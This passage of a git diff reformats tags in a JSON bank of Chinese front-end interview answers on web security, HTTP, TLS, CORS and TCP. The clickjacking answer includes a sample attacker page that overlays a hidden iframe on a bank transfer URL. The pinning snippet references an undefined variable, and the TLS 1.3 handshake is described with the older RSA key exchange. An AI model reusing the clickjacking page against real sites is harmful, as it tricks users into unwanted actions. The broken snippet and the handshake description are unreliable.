Sequelize\nUser.findOne({ where: { id: userId } });\n\n// TypeORM\nrepository.findOneBy({ id: userId });\n// ORM 自动处理参数化，防止注入\n```\n\n**3. 输入验证（前端）**\n```js\n// 验证参数格式\nfunction validateId(id) {\n  return /^\\d+$/.test(id); // 只允许数字\n}\n\nif (!validateId(userId)) {\n  throw new Error('Invalid user ID');\n}\n```\n\n**4. 最小权限原则**\n```sql\n-- 给应用数据库用户只授予必要权限\nGRANT SELECT, INSERT, UPDATE ON app.* TO 'appuser'@'localhost';\n-- 不授予 DROP、ALTER 等危险权限\n```\n\n**前端注意**\n- 前端验证只是用户体验，不是安全防御\n- 真正的防御在后端（参数化查询）\n- 不要在前端代码暴露 API 密钥或数据库信息",
-    "tags": [
-      "SQL注入",
-      "安全",
-      "数据库",
-      "后端"
-    ],
+    "tags": ["SQL注入", "安全", "数据库", "后端"],
     "source": "高频"
   },
   {
@@ -427,12 +275,7 @@
     "difficulty": 2,
     "question": "什么是 HSTS？如何防止协议降级攻击？",
     "answer": "## HSTS（HTTP Strict Transport Security）\n\n### 概念\nHSTS 是一种安全策略，通过 HTTP 响应头告诉浏览器：在指定时间内，该域名只能通过 HTTPS 访问，浏览器会自动将 HTTP 请求升级为 HTTPS。\n\n### 工作原理\n```\n1. 用户首次访问 https://example.com\n2. 服务器返回 HSTS 头：\n   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n3. 浏览器记录：example.com 在接下来 1 年内只能 HTTPS\n4. 用户之后访问 http://example.com：\n   → 浏览器不发请求，直接内部跳转到 https://example.com\n   → 即使攻击者截获请求也无法降级\n```\n\n### 配置\n```nginx\n# Nginx 配置\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\";\n\n# Express 中间件（Helmet）\nimport helmet from 'helmet';\napp.use(helmet.hsts({\n  maxAge: 31536000,\n  includeSubDomains: true,\n  preload: true\n}));\n```\n\n### 参数说明\n```\nmax-age=31536000      # 浏览器记住 1 年（秒）\nincludeSubDomains     # 包含所有子域名\npreload               # 申请加入 HSTS 预加载列表\n```\n\n### HSTS Preload List\n```\nhttps://hstspreload.org 维护的预加载列表\n→ 浏览器出厂前就内置了这些域名\n→ 即使用户从未访问过，也会直接使用 HTTPS\n→ 提交条件：max-age ≥ 31536000, includeSubDomains, preload\n```\n\n### 防御的攻击\n```\n中间人攻击（MITM）：\n❌ 攻击者无法将 HTTPS 降级为 HTTP\n❌ 攻击者无法展示伪造的 HTTP 页面\n\n注意：首次访问仍有风险（chicken-and-egg）\n→ HSTS Preload 解决了首次访问的问题\n```",
-    "tags": [
-      "HSTS",
-      "HTTPS",
-      "安全",
-      "中间人攻击"
-    ],
+    "tags": ["HSTS", "HTTPS", "安全", "中间人攻击"],
     "source": "高频"
   },
   {
@@ -441,12 +284,7 @@
     "difficulty": 2,
     "question": "如何实现前端请求的取消和超时控制？",
     "answer": "## 请求取消和超时控制\n\n### AbortController（取消请求）\n```js\nconst controller = new AbortController();\nconst { signal } = controller;\n\n// 发起可取消的请求\nasync function fetchWithCancel(url) {\n  try {\n    const res = await fetch(url, { signal });\n    return await res.json();\n  } catch (e) {\n    if (e.name === 'AbortError') {\n      console.log('请求被取消');\n    } else {\n      throw e;\n    }\n  }\n}\n\n// 取消请求\ncontroller.abort('用户取消');\n```\n\n### 超时控制\n```js\n// 方法1：AbortSignal.timeout（现代浏览器）\ntry {\n  const res = await fetch('/api/data', {\n    signal: AbortSignal.timeout(5000) // 5秒超时\n  });\n} catch (e) {\n  if (e.name === 'TimeoutError') {\n    console.log('请求超时');\n  }\n}\n\n// 方法2：Promise.race\nfunction fetchWithTimeout(url, timeout = 5000) {\n  const controller = new AbortController();\n  const timeoutId = setTimeout(() => controller.abort(), timeout);\n\n  return fetch(url, { signal: controller.signal })\n    .finally(() => clearTimeout(timeoutId));\n}\n\n// 方法3：同时处理取消和超时\nfunction fetchEnhanced(url, options = {}) {\n  const { timeout = 10000, signal: outerSignal } = options;\n  const controller = new AbortController();\n  const timeoutId = setTimeout(() => controller.abort(), timeout);\n\n  // 合并外部信号和超时信号\n  outerSignal?.addEventListener('abort', () => controller.abort());\n\n  return fetch(url, { ...options, signal: controller.signal })\n    .finally(() => clearTimeout(timeoutId));\n}\n```\n\n### React 中的请求取消\n```jsx\nuseEffect(() => {\n  const controller = new AbortController();\n\n  async function loadData() {\n    try {\n      const res = await fetch('/api/user', {\n        signal: controller.signal\n      });\n      const data = await res.json();\n      setUser(data);\n    } catch (e) {\n      if (e.name !== 'AbortError') {\n        setError(e.message);\n      }\n    }\n  }\n\n  loadData();\n\n  return () => controller.abort(); // 组件卸载时取消\n}, [userId]);\n```\n\n### Axios 取消\n```js\n// Axios CancelToken（旧）\nconst cancelToken = axios.CancelToken;\nconst source = cancelToken.source();\n\naxios.get('/api/data', { cancelToken: source.token });\nsource.cancel('用户取消');\n\n// Axios AbortController（新，推荐）\nconst controller = new AbortController();\naxios.get('/api/data', { signal: controller.signal });\ncontroller.abort();\n```",
-    "tags": [
-      "AbortController",
-      "Fetch",
-      "超时",
-      "取消请求"
-    ],
+    "tags": ["AbortController", "Fetch", "超时", "取消请求"],
     "source": "高频"
   },
   {
@@ -455,12 +293,7 @@
     "difficulty": 3,
     "question": "HTTP/2 的多路复用是如何实现的？帧（Frame）是什么？",
     "answer": "## HTTP/2 多路复用与帧\n\n### 帧（Frame）\nHTTP/2 将消息分割为多个**帧**进行传输。\n\n```\nHTTP/2 帧结构：\n+-----------------------------------------------+\n|                 Length (24)                   |\n+---------------+---------------+---------------+\n|   Type (8)    |   Flags (8)   |\n+-+-------------+---------------+-----+---------+\n|R|                 Stream Identifier (31)       |\n+=+=============================================================+\n|                   Frame Payload (0...)\n+---------------------------------------------------------------+\n\n字段：\n- Length：帧负载长度\n- Type：帧类型（DATA, HEADERS, SETTINGS...）\n- Flags：帧标志\n- Stream ID：所属流的 ID（0=连接级别）\n```\n\n### 流（Stream）\n```\n一个流 = 一个完整的请求/响应交换\n多个流共享同一 TCP 连接\n\nStream 1：GET /index.html\nStream 3：GET /app.js\nStream 5：GET /style.css\n\n所有流的帧交错传输（Multiplexing）：\nS1-HEADERS → S3-HEADERS → S5-HEADERS → S1-DATA → S5-DATA → S3-DATA\n```\n\n### 帧类型\n```\nDATA(0x0)      - 传输 HTTP 消息体\nHEADERS(0x1)   - 传输 HTTP 请求/响应头（HPACK 压缩）\nPRIORITY(0x2)  - 流优先级\nRST_STREAM(0x3) - 重置流\nSETTINGS(0x4)  - 连接配置\nPUSH_PROMISE(0x5) - 服务端推送\nGOAWAY(0x7)    - 关闭连接\nWINDOW_UPDATE(0x8) - 流量控制\nCONTINUATION(0x9) - 续传头部\n```\n\n### 与 HTTP/1.1 对比\n```\nHTTP/1.1 管道化（不常用）：\n→ 请求必须按顺序发送，响应也必须按顺序\n→ 队头阻塞：第一个响应慢，后面都被阻塞\n\nHTTP/2 多路复用：\n→ 请求/响应交错发送，无需按顺序\n→ 解决了应用层的队头阻塞\n→ TCP 层的队头阻塞由 HTTP/3 解决\n```\n\n### HPACK 头部压缩\n```\n静态表（Static Table）：\n→ 61 个预定义的常用头部（如 :method GET, :status 200）\n\n动态表（Dynamic Table）：\n→ 连接级别维护的已发送头部字典\n→ 后续请求只需发送索引号\n\nHuffman 编码：\n→ 对字符串值进一步压缩\n```",
-    "tags": [
-      "HTTP/2",
-      "多路复用",
-      "帧",
-      "HPACK"
-    ],
+    "tags": ["HTTP/2", "多路复用", "帧", "HPACK"],
     "source": "高频"
   },
   {
@@ -469,13 +302,7 @@
     "difficulty": 3,
     "question": "什么是中间人攻击（MITM）？如何防御？",
     "answer": "## 中间人攻击（Man-in-the-Middle Attack）\n\n### 概念\n攻击者将自己插入客户端和服务器之间的通信中，可以窃听、篡改数据。\n\n### 攻击方式\n\n**1. ARP 欺骗（局域网）**\n```\n攻击者伪装成网关，让局域网内的设备将流量发给攻击者\n→ 攻击者可以看到所有 HTTP 明文流量\n```\n\n**2. DNS 劫持**\n```\n攻击者控制 DNS 服务器，将域名解析到攻击者的 IP\n→ 用户访问 bank.com 实际上访问的是假冒网站\n```\n\n**3. SSL 剥离（SSL Stripping）**\n```\n攻击者在客户端和服务器之间充当代理\n→ 与客户端用 HTTP 通信（降级）\n→ 与服务器用 HTTPS 通信\n→ 客户端不知道通信已被降级\n```\n\n**4. 伪造证书**\n```\n攻击者生成自签名证书\n→ 与客户端建立假 HTTPS 连接\n→ 浏览器会提示证书错误（但用户可能忽略）\n```\n\n### 防御措施\n\n**1. HTTPS**\n```\n加密传输，防止窃听\n证书验证，防止伪造\n```\n\n**2. HSTS**\n```\nStrict-Transport-Security: max-age=31536000\n→ 浏览器强制使用 HTTPS，防止 SSL 剥离\n```\n\n**3. 证书固定（Certificate Pinning）**\n```js\n// 移动端/Electron 中可以固定证书指纹\n// 即使攻击者有有效证书也无法通过\nconst expectedPubKey = 'sha256//AbCdEf123...';\n\nhttps.get('https://api.example.com', {\n  checkServerIdentity: (host, cert) => {\n    const fingerprint = cert.fingerprint256;\n    if (fingerprint !== expectedFingerprint) {\n      return new Error('证书不匹配');\n    }\n  }\n});\n```\n\n**4. Subresource Integrity（SRI）**\n```html\n<!-- 验证 CDN 资源未被篡改 -->\n<script\n  src=\"https://cdn.example.com/lib.js\"\n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n  crossorigin=\"anonymous\">\n</script>\n```",
-    "tags": [
-      "MITM",
-      "中间人攻击",
-      "HSTS",
-      "证书",
-      "安全"
-    ],
+    "tags": ["MITM", "中间人攻击", "HSTS", "证书", "安全"],
     "source": "高频"
   },
   {
@@ -484,12 +311,7 @@
     "difficulty": 3,
     "question": "如何实现前端请求的重试机制？",
     "answer": "## 请求重试机制\n\n### 基础重试\n```js\nasync function fetchWithRetry(url, options = {}, retries = 3) {\n  try {\n    const res = await fetch(url, options);\n    if (!res.ok) throw new Error(`HTTP Error: ${res.status}`);\n    return await res.json();\n  } catch (error) {\n    if (retries > 0) {\n      console.log(`请求失败，${retries} 次重试机会`);\n      return fetchWithRetry(url, options, retries - 1);\n    }\n    throw error;\n  }\n}\n```\n\n### 指数退避（Exponential Backoff）\n```js\nasync function fetchWithExponentialBackoff(\n  url,\n  options = {},\n  config = { maxRetries: 3, baseDelay: 1000, maxDelay: 10000 }\n) {\n  const { maxRetries, baseDelay, maxDelay } = config;\n\n  for (let attempt = 0; attempt <= maxRetries; attempt++) {\n    try {\n      const res = await fetch(url, options);\n\n      // 4xx 不重试（客户端错误）\n      if (res.status >= 400 && res.status < 500) {\n        throw new Error(`Client Error: ${res.status}`);\n      }\n\n      if (!res.ok) throw new Error(`Server Error: ${res.status}`);\n\n      return await res.json();\n    } catch (error) {\n      // 最后一次，直接抛出\n      if (attempt === maxRetries) throw error;\n\n      // 指数退避 + 随机抖动（避免同时重试造成雪崩）\n      const delay = Math.min(\n        baseDelay * Math.pow(2, attempt) + Math.random() * 1000,\n        maxDelay\n      );\n\n      console.log(`第 ${attempt + 1} 次失败，${delay.toFixed(0)}ms 后重试...`);\n      await new Promise(resolve => setTimeout(resolve, delay));\n    }\n  }\n}\n\n// 重试延迟：1s → 2s+抖动 → 4s+抖动（最多 10s）\n```\n\n### Axios 拦截器实现重试\n```js\nimport axios from 'axios';\n\nconst instance = axios.create({ baseURL: 'https://api.example.com' });\n\ninstance.interceptors.response.use(\n  response => response,\n  async (error) => {\n    const { config, response } = error;\n\n    // 设置重试次数\n    config._retryCount = config._retryCount || 0;\n\n    // 以下情况不重试：客户端错误、超过次数、取消请求\n    if (\n      (response?.status >= 400 && response?.status < 500) ||\n      config._retryCount >= 3 ||\n      axios.isCancel(error)\n    ) {\n      return Promise.reject(error);\n    }\n\n    config._retryCount++;\n\n    const delay = 1000 * Math.pow(2, config._retryCount - 1);\n    await new Promise(resolve => setTimeout(resolve, delay));\n\n    return instance(config);\n  }\n);\n```\n\n### React Query 内置重试\n```js\nimport { useQuery } from '@tanstack/react-query';\n\nconst { data } = useQuery({\n  queryKey: ['user'],\n  queryFn: fetchUser,\n  retry: 3,                    // 最多重试 3 次\n  retryDelay: attemptIndex => Math.min(1000 * 2 ** attemptIndex, 30000),\n});\n```",
-    "tags": [
-      "请求重试",
-      "指数退避",
-      "Axios",
-      "React Query"
-    ],
+    "tags": ["请求重试", "指数退避", "Axios", "React Query"],
     "source": "高频"
   },
   {
@@ -498,12 +320,7 @@
     "difficulty": 2,
     "question": "什么是 HTTPS 降级攻击？如何防止？",
     "answer": "## HTTPS 降级攻击（SSL Stripping）\n\n### 攻击原理\n```\n正常流程：\n用户 → https://bank.com → 服务器\n\n降级攻击：\n用户 → http://bank.com 攻击者代理 → https://bank.com → 服务器\n\n攻击者与用户之间用 HTTP，可以明文看到所有数据\n用户以为用的是 HTTP（因为没有锁图标），或没注意\n```\n\n### 防御措施\n\n**1. HSTS（最重要）**\n```\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n浏览器收到 HSTS 头后，在有效期内：\n→ 自动将 http:// 请求转为 https://\n→ 不发出 HTTP 请求，从根本上防止降级\n```\n\n**2. HSTS Preload**\n```\n提交到 https://hstspreload.org 的域名被内置在浏览器中\n→ 即使用户从未访问过，也会使用 HTTPS\n→ 彻底消除首次访问的风险窗口\n```\n\n**3. 服务端 301 重定向**\n```nginx\nserver {\n  listen 80;\n  server_name example.com www.example.com;\n  # 将所有 HTTP 重定向到 HTTPS\n  return 301 https://$server_name$request_uri;\n}\n\nserver {\n  listen 443 ssl;\n  # HSTS 头\n  add_header Strict-Transport-Security \"max-age=31536000\" always;\n}\n```\n\n**4. Secure Cookie**\n```\nSet-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict\n\nSecure 标志：只在 HTTPS 下发送 Cookie\n→ 即使页面被降级为 HTTP，Cookie 也不会泄露\n```",
-    "tags": [
-      "HTTPS",
-      "SSL Stripping",
-      "HSTS",
-      "安全"
-    ],
+    "tags": ["HTTPS", "SSL Stripping", "HSTS", "安全"],
     "source": "高频"
   },
   {
@@ -512,13 +329,7 @@
     "difficulty": 2,
     "question": "什么是点击劫持（Clickjacking）？如何防御？",
     "answer": "## 点击劫持（Clickjacking）\n\n### 概念\n攻击者将目标网站嵌入透明的 iframe，覆盖在诱导内容上，让用户在不知情的情况下点击了目标网站的按钮。\n\n### 攻击示例\n```html\n<!-- 攻击者的页面 -->\n<style>\n  .lure { position: relative; }\n  .bait { font-size: 24px; position: absolute; left: 0; top: 0; z-index: 1; }\n  iframe {\n    position: absolute;\n    left: 0;\n    top: 0;\n    opacity: 0; /* 透明！用户看不见 */\n    z-index: 2;\n    width: 200px;\n    height: 80px;\n  }\n</style>\n\n<div class=\"lure\">\n  <div class=\"bait\">点击领取大奖！</div>\n  <!-- 实际上点击的是银行转账按钮 -->\n  <iframe src=\"https://bank.com/transfer?to=attacker&amount=1000\"></iframe>\n</div>\n```\n\n### 防御措施\n\n**1. X-Frame-Options 响应头**\n```\nX-Frame-Options: DENY           # 禁止任何来源嵌入\nX-Frame-Options: SAMEORIGIN     # 只允许同源嵌入\nX-Frame-Options: ALLOW-FROM https://trusted.com  # 指定来源（已弃用）\n```\n\n**2. CSP frame-ancestors（更强大）**\n```\nContent-Security-Policy: frame-ancestors 'none'\nContent-Security-Policy: frame-ancestors 'self'\nContent-Security-Policy: frame-ancestors 'self' https://trusted.com\n\n→ frame-ancestors 是 X-Frame-Options 的现代替代方案\n→ 优先级更高，支持多个来源\n```\n\n**3. Nginx 配置**\n```nginx\nadd_header X-Frame-Options \"DENY\" always;\nadd_header Content-Security-Policy \"frame-ancestors 'none'\" always;\n```\n\n**4. JS 框架破解（frame busting，辅助手段）**\n```js\n// 检测是否被嵌入 iframe\nif (window.top !== window.self) {\n  window.top.location = window.self.location;\n}\n// 注意：可以被 sandbox 属性绕过，不可单独依赖\n```\n\n### 合法 iframe 使用场景\n```\n如果自己的应用需要在 iframe 中使用（如第三方嵌入）：\nContent-Security-Policy: frame-ancestors 'self' https://partner.com\n```",
-    "tags": [
-      "点击劫持",
-      "Clickjacking",
-      "X-Frame-Options",
-      "CSP",
-      "安全"
-    ],
+    "tags": ["点击劫持", "Clickjacking", "X-Frame-Options", "CSP", "安全"],
     "source": "高频"
   },
   {
@@ -527,12 +338,7 @@
     "difficulty": 2,
     "question": "HTTP 缓存机制详解：强缓存和协商缓存的区别？",
     "answer": "## HTTP 缓存机制\n\n### 强缓存（不请求服务器）\n浏览器直接使用本地缓存，返回 200（from cache）。\n\n```http\n# 响应头设置强缓存\nCache-Control: max-age=31536000  # 秒数，优先级高于 Expires\nExpires: Wed, 21 Oct 2025 07:28:00 GMT  # 绝对时间，已过时\n```\n\n```\n触发条件：资源未过期\n状态码：200 (from disk/memory cache)\n是否请求服务器：否\n```\n\n### 协商缓存（请求服务器验证）\n浏览器携带缓存标识请求服务器，服务器决定是否使用缓存。\n\n```http\n# 方式1：Last-Modified / If-Modified-Since（精度秒级）\n响应：Last-Modified: Wed, 21 Oct 2024 07:28:00 GMT\n请求：If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT\n\n# 方式2：ETag / If-None-Match（精度更高，优先级更高）\n响应：ETag: \"abc123def456\"\n请求：If-None-Match: \"abc123def456\"\n```\n\n```\n命中协商缓存：304 Not Modified（无 body，节省带宽）\n未命中：200 + 新资源\n```\n\n### 缓存决策流程\n```\n请求资源\n  ↓\n有缓存？→ 否 → 请求服务器 → 200 + 缓存\n  ↓ 是\n强缓存是否过期？→ 否 → 200 from cache\n  ↓ 是\n携带 ETag/Last-Modified 请求服务器\n  ↓\n资源未变化？→ 是 → 304 Not Modified（用本地缓存）\n  ↓ 否\n200 + 新资源 + 新缓存标识\n```\n\n### Cache-Control 常用值\n```http\nCache-Control: no-store        # 完全不缓存\nCache-Control: no-cache        # 每次都协商缓存（不是不缓存！）\nCache-Control: private         # 只允许浏览器缓存，CDN不缓存\nCache-Control: public          # CDN 也可缓存\nCache-Control: max-age=0, must-revalidate  # 强制协商\nCache-Control: immutable       # 资源不变（配合 hash 文件名使用）\n```\n\n### 最佳实践\n```\nHTML：Cache-Control: no-cache（每次协商，保证更新及时）\nJS/CSS（带 hash）：Cache-Control: max-age=31536000, immutable（长期强缓存）\n图片：Cache-Control: max-age=86400（1天）\nAPI 接口：Cache-Control: no-store（敏感数据）\n```",
-    "tags": [
-      "HTTP",
-      "缓存",
-      "强缓存",
-      "协商缓存"
-    ],
+    "tags": ["HTTP", "缓存", "强缓存", "协商缓存"],
     "source": "高频"
   },
   {
@@ -541,10 +347,7 @@
     "difficulty": 1,
     "question": "常见 HTTP 状态码有哪些？分别代表什么意思？",
     "answer": "## HTTP 状态码\n\n### 1xx 信息性\n```\n100 Continue        继续发送请求体\n101 Switching Protocols  协议升级（如 WebSocket）\n```\n\n### 2xx 成功\n```\n200 OK              请求成功\n201 Created         资源创建成功（POST）\n204 No Content      成功但无响应体（DELETE）\n206 Partial Content 范围请求成功（断点续传）\n```\n\n### 3xx 重定向\n```\n301 Moved Permanently   永久重定向（浏览器缓存新地址）\n302 Found               临时重定向（每次都请求原地址）\n304 Not Modified        协商缓存命中\n307 Temporary Redirect  临时重定向，保持请求方法不变\n308 Permanent Redirect  永久重定向，保持请求方法不变\n```\n\n### 4xx 客户端错误\n```\n400 Bad Request         请求语法错误\n401 Unauthorized        未认证（需要登录）\n403 Forbidden           无权限（已认证但没权限）\n404 Not Found           资源不存在\n405 Method Not Allowed  请求方法不允许\n409 Conflict            资源冲突\n413 Payload Too Large   请求体过大\n429 Too Many Requests   限流\n```\n\n### 5xx 服务端错误\n```\n500 Internal Server Error  服务器内部错误\n502 Bad Gateway            网关错误（上游服务异常）\n503 Service Unavailable    服务不可用（过载/维护）\n504 Gateway Timeout        网关超时\n```\n\n### 面试常考区分\n```\n301 vs 302：301 永久，浏览器会缓存跳转；302 临时，每次都走原地址\n401 vs 403：401 没登录；403 登录了但没权限\n302 vs 307：302 可能将 POST 改为 GET；307 严格保持方法不变\n```",
-    "tags": [
-      "HTTP",
-      "状态码"
-    ],
+    "tags": ["HTTP", "状态码"],
     "source": "高频"
   },
   {
@@ -553,12 +356,7 @@
     "difficulty": 2,
     "question": "HTTPS 的工作原理是什么？TLS 握手过程详解？",
     "answer": "## HTTPS / TLS 工作原理\n\n### 为什么需要 HTTPS\n```\nHTTP 明文传输，存在：\n- 窃听风险（内容被中间人读取）\n- 篡改风险（内容被修改）\n- 冒充风险（无法验证服务器身份）\n\nHTTPS = HTTP + TLS（传输层安全）解决以上三个问题\n```\n\n### TLS 1.3 握手过程（简化版）\n```\n客户端                              服务器\n  │── ClientHello ────────────────►│\n  │   (支持的算法、随机数 C)          │\n  │                                 │\n  │◄─── ServerHello ───────────────│\n  │     (选定算法、随机数 S、证书)     │\n  │                                 │\n  │  [验证证书：CA 链、有效期、域名]   │\n  │                                 │\n  │── 生成预主密钥，用服务器公钥加密 ──►│\n  │                                 │  服务器用私钥解密\n  │  [双方用 C + S + 预主密钥生成会话密钥]\n  │                                 │\n  │── Finished ────────────────────►│\n  │◄─── Finished ───────────────────│\n  │                                 │\n  │════ 对称加密通信（会话密钥）═════│\n```\n\n### 证书验证\n```\n1. 浏览器内置受信任的根 CA 列表\n2. 服务器证书由中间 CA 签名，中间 CA 由根 CA 签名（证书链）\n3. 验证内容：\n   - 数字签名（防篡改）\n   - 有效期\n   - 域名匹配（CN 或 SAN）\n   - 证书未被吊销（CRL/OCSP）\n```\n\n### 对称 vs 非对称加密\n```\n握手阶段：非对称加密（RSA/ECDH）安全交换密钥，但慢\n传输阶段：对称加密（AES-GCM）快速加密数据\n\nTLS 1.3 改进：\n- 1-RTT 握手（TLS 1.2 需要 2-RTT）\n- 支持 0-RTT 恢复（有重放风险）\n- 废弃不安全算法（RSA 密钥交换、SHA-1 等）\n```",
-    "tags": [
-      "HTTPS",
-      "TLS",
-      "加密",
-      "证书"
-    ],
+    "tags": ["HTTPS", "TLS", "加密", "证书"],
     "source": "高频"
   },
   {
@@ -567,11 +365,7 @@
     "difficulty": 2,
     "question": "什么是同源策略？CORS 跨域的完整机制是什么？",
     "answer": "## 同源策略与 CORS\n\n### 同源策略\n同源 = 协议 + 域名 + 端口 完全相同。\n\n```\nhttps://a.com/page  vs  https://a.com/other  ✅ 同源（路径不同）\nhttps://a.com       vs  http://a.com         ❌ 协议不同\nhttps://a.com       vs  https://b.com        ❌ 域名不同\nhttps://a.com:443   vs  https://a.com:8080   ❌ 端口不同\nhttps://a.com       vs  https://sub.a.com    ❌ 子域名不同\n```\n\n### CORS 简单请求\n满足以下条件的请求直接发送，服务器通过响应头允许：\n```\n方法：GET / POST / HEAD\n请求头：只含 Accept、Content-Type（text/plain、multipart/form-data、application/x-www-form-urlencoded）\n```\n\n```http\n# 浏览器自动添加 Origin\nOrigin: https://frontend.com\n\n# 服务器响应\nAccess-Control-Allow-Origin: https://frontend.com  # 或 *\nAccess-Control-Allow-Credentials: true  # 允许 Cookie\n```\n\n### CORS 预检请求（Preflight）\n非简单请求（如 PUT/DELETE、JSON body、自定义请求头）先发 OPTIONS：\n\n```http\n# 预检请求\nOPTIONS /api/data HTTP/1.1\nOrigin: https://frontend.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Content-Type, Authorization\n\n# 预检响应\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400  # 预检缓存时间（秒），避免每次都预检\n```\n\n### Node.js 服务端设置\n```js\n// Express\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', 'https://frontend.com');\n  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');\n  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');\n  res.header('Access-Control-Allow-Credentials', 'true');\n  if (req.method === 'OPTIONS') return res.sendStatus(204);\n  next();\n});\n```\n\n### 其他跨域方案\n```\nJSONP：只支持 GET，通过 <script> 标签绕过同源（已淘汰）\n代理：Nginx 反向代理、开发环境 webpack devServer proxy\npostMessage：iframe 跨域通信\ndocument.domain：限同父域（已废弃）\n```",
-    "tags": [
-      "跨域",
-      "CORS",
-      "同源策略"
-    ],
+    "tags": ["跨域", "CORS", "同源策略"],
     "source": "高频"
   },
   {
@@ -580,11 +374,7 @@
     "difficulty": 1,
     "question": "TCP 三次握手和四次挥手的过程是什么？为什么需要三次？",
     "answer": "## TCP 三次握手与四次挥手\n\n### 三次握手（建立连接）\n```\n客户端                    服务器\n  │── SYN(seq=x) ────────►│  客户端：我要连接，序号 x\n  │◄── SYN-ACK(seq=y,ack=x+1) ─│  服务器：收到，我的序号 y，期待 x+1\n  │── ACK(ack=y+1) ───────►│  客户端：收到，期待 y+1\n  │                         │\n  └── 连接建立，开始传输数据 ──┘\n```\n\n### 为什么需要三次握手？\n```\n1. 确认双方的发送和接收能力都正常\n2. 同步双方的初始序列号（ISN）\n3. 防止已失效的连接请求报文突然到达服务器造成错误\n   （若只有两次握手，旧的 SYN 到达服务器会直接建立连接，浪费资源）\n```\n\n### 四次挥手（断开连接）\n```\n客户端                    服务器\n  │── FIN(seq=u) ─────────►│  客户端：我要断开（半关闭）\n  │◄── ACK(ack=u+1) ───────│  服务器：收到你的 FIN\n  │                         │  （服务器可能还有数据要发）\n  │◄── FIN(seq=v) ──────────│  服务器：我也要断开了\n  │── ACK(ack=v+1) ─────────►│  客户端：收到\n  │                         │\n  └── 等待 2MSL 后完全关闭 ──┘\n```\n\n### 为什么需要四次挥手（而不是三次）？\n```\nTCP 是全双工的，双方各自独立关闭。\n服务器收到 FIN 后，可能还有数据未发完，\n所以 ACK 和 FIN 不能合并（不像握手时 SYN+ACK 可以合并）。\n```\n\n### TIME_WAIT（等待 2MSL）\n```\n客户端发送最后 ACK 后等待 2MSL（最大报文段生存时间）：\n1. 确保服务器收到了最后的 ACK（若丢失，服务器会重发 FIN）\n2. 让本次连接的报文全部消失，避免影响下一个相同端口的连接\n```",
-    "tags": [
-      "TCP",
-      "三次握手",
-      "四次挥手"
-    ],
+    "tags": ["TCP", "三次握手", "四次挥手"],
     "source": "高频"
   },
   {
@@ -593,11 +383,7 @@
     "difficulty": 2,
     "question": "HTTP/1.1、HTTP/2、HTTP/3 的核心区别是什么？",
     "answer": "## HTTP 版本对比\n\n### HTTP/1.1 的问题\n```\n队头阻塞：同一连接的请求必须串行，前一个响应未完成后续请求等待\n连接数限制：浏览器对同域最多 6 个 TCP 连接\nHeader 冗余：每次请求都发送大量重复头部（Cookie、UA 等）\n```\n\n### HTTP/2 改进\n```\n1. 多路复用（Multiplexing）\n   - 单个 TCP 连接上并行发送多个请求/响应\n   - 帧（Frame）+ 流（Stream）机制\n   - 解决 HTTP 层队头阻塞\n\n2. 头部压缩（HPACK）\n   - 静态表 + 动态表 + Huffman 编码\n   - 重复 Header 只发差异部分\n\n3. 服务器推送（Server Push）\n   - 服务器主动推送客户端可能需要的资源\n   - 实际应用中较少使用（被 103 Early Hints 替代）\n\n4. 二进制分帧\n   - 文本协议 → 二进制协议，更高效\n\n5. 流优先级\n   - 可设置请求优先级\n```\n\n### HTTP/2 遗留问题\n```\nTCP 层队头阻塞：TCP 丢包时，整个连接的所有流都要等待重传\nTCP 握手延迟：HTTPS 需要 TCP 3次握手 + TLS 握手\n```\n\n### HTTP/3 改进\n```\n基于 QUIC（UDP）：\n1. 彻底解决队头阻塞：QUIC 流独立，一个流丢包不影响其他流\n2. 0-RTT / 1-RTT 握手：QUIC 集成 TLS 1.3，握手更快\n3. 连接迁移：基于 Connection ID 而非 IP+端口，切换网络不断连\n4. 改进的拥塞控制\n```\n\n### 对比总结\n```\n特性          HTTP/1.1    HTTP/2      HTTP/3(QUIC)\n传输层         TCP         TCP         UDP(QUIC)\n多路复用       ❌ 串行      ✅           ✅\n队头阻塞       HTTP+TCP层  TCP层        ✅彻底解决\n头部压缩       ❌           HPACK        QPACK\n握手RTT        1(TLS+1)    1(TLS+1)    0/1-RTT\n连接迁移       ❌           ❌           ✅\n```",
-    "tags": [
-      "HTTP2",
-      "HTTP3",
-      "性能"
-    ],
+    "tags": ["HTTP2", "HTTP3", "性能"],
     "source": "高频"
   },
   {
@@ -606,11 +392,7 @@
     "difficulty": 2,
     "question": "什么是 XSS 攻击？如何防御？",
     "answer": "## XSS（跨站脚本攻击）\n\n### 类型\n\n**1. 存储型 XSS（持久型，最危险）**\n```\n攻击者将恶意脚本存入数据库 → 其他用户访问时脚本被执行\n场景：评论区、个人简介、富文本编辑器\n```\n\n**2. 反射型 XSS（非持久型）**\n```\n恶意脚本在 URL 参数中 → 服务器反射回页面 → 执行\n场景：搜索框、错误页面（需诱导用户点击恶意链接）\n```\n\n**3. DOM 型 XSS**\n```\n前端 JS 将 URL 参数直接插入 DOM 而未做过滤\n场景：document.write(location.hash)\n```\n\n### 防御措施\n\n**1. 输入过滤 / 输出转义（最重要）**\n```js\n// 危险：直接插入 HTML\nel.innerHTML = userInput;\n\n// 安全：转义特殊字符\nconst escape = (str) =>\n  str.replace(/&/g,'&amp;').replace(/</g,'&lt;')\n     .replace(/>/g,'&gt;').replace(/\"/g,'&quot;')\n     .replace(/'/g,'&#39;');\nel.textContent = userInput; // 最安全\n```\n\n**2. CSP（内容安全策略）**\n```http\n# 只允许同源脚本\nContent-Security-Policy: script-src 'self'\n# 禁止内联脚本（最有效防御 XSS）\nContent-Security-Policy: script-src 'self' 'nonce-abc123'\n# 禁止所有外部资源\nContent-Security-Policy: default-src 'self'\n```\n\n**3. HttpOnly Cookie**\n```http\nSet-Cookie: 